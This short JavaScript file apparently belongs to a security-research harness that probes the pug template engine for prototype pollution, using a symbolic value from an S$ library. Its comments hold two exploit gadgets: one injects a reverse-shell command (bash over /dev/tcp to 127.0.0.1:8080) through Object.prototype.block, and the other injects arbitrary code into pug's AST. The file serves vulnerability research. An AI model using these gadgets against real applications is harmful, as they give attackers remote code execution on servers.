pug = require("pug")
S$ = require("../../../lib/S$")

/* Payload Injection*/
// inject property to root prototype

// exp-1
// Object.prototype.block = {
//     type: "Text",
//     line: "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
// }
Object.prototype.block = S$.pureSymbol('block_undef');

// exp-2
// Object.prototype['attrs'] = [];
// Object.prototype['attributeBlocks'] = [];
// Object.prototype['block'] = 
// { 
//   type: "Block",
//   nodes: [
//     {
//       type:"Tag",
//       name:"p",
//       block:{
//         type:"Block",
//         nodes:[
//           {
//             type:"Code",
//             val:"console.log('universal code injection!!!')",
//             block:{
//               type: "Block",
//               nodes:[
//                 {
//                   type: "Comment",
//                   val: "End the visiting node process"
//                 }
//               ]
//             }
//           },
//         ],
//       },
//     },
//   ]}



const template = pug.compile(`h1= msg`);
// console.log(template({msg: "Hello World"}));

// console.log(template.toString());